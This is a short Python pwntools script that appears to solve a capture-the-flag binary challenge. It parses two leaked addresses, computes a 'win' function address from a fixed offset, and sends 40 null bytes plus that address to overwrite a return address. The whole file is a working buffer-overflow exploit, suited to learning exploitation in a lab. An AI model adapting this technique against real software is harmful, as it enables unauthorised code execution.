from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvline()
ret_addr = line[:line.find(b', ')]
print('ret_addr', ret_addr)

io.recvuntil(b'@ ')
line = io.recvline()
deadbeef_addr = line[:line.find(b'\n')]
print('deadbeef_addr', deadbeef_addr)

# win addr - deadbeef addr = -10807
win_addr = p64(int(deadbeef_addr, 16)-10807)

pwnmsg = b'\x00'*40+win_addr

io.sendline(pwnmsg)

io.interactive()
